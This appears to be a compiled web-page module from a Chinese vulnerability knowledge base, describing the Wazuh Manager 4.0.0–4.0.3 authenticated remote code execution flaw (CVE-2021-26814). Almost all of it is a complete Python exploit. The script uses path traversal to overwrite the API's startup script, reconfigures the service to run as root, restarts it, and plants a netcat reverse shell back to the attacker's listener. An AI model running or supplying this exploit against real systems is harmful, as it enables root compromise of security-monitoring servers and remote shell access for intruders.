import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const e={},p=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Wazuh 从4.0.0到4.0.3的 Wazuh API允许经过身份验证的用户通过/manager/files URI以管理权限执行任意代码。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Wazuh Manager  v.4.0.0-4.0.3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>PoC.py [-h] -user USERNAME -pwd PASSWORD -lip SRCIP -lport SRCPORT -tip
              DESTIP -tport DESTPORT
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># Exploit Title: Wazuh 4.0.3 API RCE</span>
<span class="token comment"># Author: WickdDavid (Davide Meacci)</span>
<span class="token comment"># Date: 2021-01-01</span>
<span class="token comment"># Vendor Homepage: https://github.com/wazuh/wazuh</span>
<span class="token comment"># Version : 4.0.3</span>


<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> time
<span class="token keyword">import</span> json
<span class="token keyword">from</span> urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning
requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>category<span class="token operator">=</span>InsecureRequestWarning<span class="token punctuation">)</span>


parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&#39;Wazuh-manager authenticated RCE by WickdDavid&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-user&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;username&#39;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;wazuh API username&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-pwd&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;password&#39;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;wazuh API password&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-lip&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;srcip&#39;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;listening server&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-lport&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;srcport&#39;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;listening port&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-tip&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;destip&#39;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;target server ip (wazuh API)&#39;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-tport&#39;</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">&#39;destport&#39;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;target server port (wazuh API)&#39;</span><span class="token punctuation">)</span>


args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># executed payload may be changed here</span>

exec_payload <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;
import os #:l
os.system(&quot;nc %s %s -e /bin/sh&quot;) #:l
&quot;&quot;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>srcip<span class="token punctuation">,</span> args<span class="token punctuation">.</span>srcport<span class="token punctuation">)</span>


config_payload <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">&quot;drop_privileges&quot;</span><span class="token punctuation">:</span> <span class="token boolean">False</span> <span class="token punctuation">}</span>


proxies <span class="token operator">=</span> <span class="token punctuation">{</span>
	<span class="token string">&quot;http&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;http://127.0.0.1:8080&quot;</span><span class="token punctuation">,</span>
	<span class="token string">&quot;https&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;https://127.0.0.1:8080&quot;</span>
<span class="token punctuation">}</span>

target <span class="token operator">=</span> <span class="token string">&quot;https://%s:%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>destip<span class="token punctuation">,</span>args<span class="token punctuation">.</span>destport<span class="token punctuation">)</span>
auth_token <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
path_traversal <span class="token operator">=</span> <span class="token string">&quot;etc/lists/../../../../..&quot;</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

<span class="token comment"># step 1 - obtaining auth token</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;%s/security/user/authenticate?raw=true&quot;</span> <span class="token operator">%</span> target<span class="token punctuation">,</span> auth<span class="token operator">=</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>username<span class="token punctuation">,</span> args<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    auth_token <span class="token operator">=</span> r<span class="token punctuation">.</span>text
    headers<span class="token punctuation">[</span><span class="token string">&quot;Authorization&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;Bearer %s&quot;</span> <span class="token operator">%</span> auth_token
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[!] No auth code recovered. Check username and password&quot;</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># step 2 - Privilege Escalation on API (not implemented)</span>


<span class="token comment"># step 3 - Save files to be restored later</span>

file_to_overwrite <span class="token operator">=</span> <span class="token string">&quot;/var/ossec/api/scripts/wazuh-apid.py&quot;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Saving files to restore later...&quot;</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;%s/manager/files?path=%s%s&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span>path_traversal<span class="token punctuation">,</span>file_to_overwrite<span class="token punctuation">)</span><span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;backup.py&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;w&quot;</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&quot;contents&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># step 4 - Local Privilege Escalation </span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Changing API config to run as root...&quot;</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">&quot;%s/manager/api/config&quot;</span> <span class="token operator">%</span> target<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> json <span class="token operator">=</span> config_payload<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># step 5 - Restart server (now api service runs as root) </span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Restarting server...&quot;</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">&quot;%s/manager/restart?wait_for_complete=true&quot;</span> <span class="token operator">%</span> target<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token comment">#print(r.text)</span>

data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;title&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;Bad Request&quot;</span><span class="token punctuation">}</span>
<span class="token keyword">while</span> <span class="token string">&quot;title&quot;</span> <span class="token keyword">in</span> data <span class="token keyword">and</span> <span class="token string">&quot;Bad request&quot;</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">&quot;title&quot;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;%s/manager/status&quot;</span> <span class="token operator">%</span> target<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token comment">#print(r.text)</span>
        data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>

<span class="token comment"># step 6 - Overwrite /var/ossec/api/scripts/wazuh-apid.py with malicious python payload</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Uploading payload...&quot;</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">&quot;%s/manager/files?path=%s%s&amp;overwrite=true&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span>path_traversal<span class="token punctuation">,</span>file_to_overwrite<span class="token punctuation">)</span><span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> data <span class="token operator">=</span> exec_payload<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token comment">#print(r.text)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># step 7 - Restart server (now malicious payload will be run by the server)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Restarting API service for the last time...&quot;</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">&quot;%s/manager/restart?wait_for_complete=true&quot;</span> <span class="token operator">%</span> target<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token comment">#print(r.text)</span>

data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;title&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;Bad Request&quot;</span><span class="token punctuation">}</span>
<span class="token keyword">while</span> <span class="token string">&quot;title&quot;</span> <span class="token keyword">in</span> data <span class="token keyword">and</span> <span class="token string">&quot;Bad request&quot;</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">&quot;title&quot;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;%s/manager/status&quot;</span> <span class="token operator">%</span> target<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token comment">#print(r.text)</span>
        data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>


<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Payload executed, check your shell now.&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Remember to restore changed file (check local backup file)&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,8),o=[p];function c(i,l){return s(),a("div",null,o)}const k=n(e,[["render",c],["__file","Wazuh Manager 代码执行漏洞 CVE-2021-26814.html.vue"]]);export{k as default};
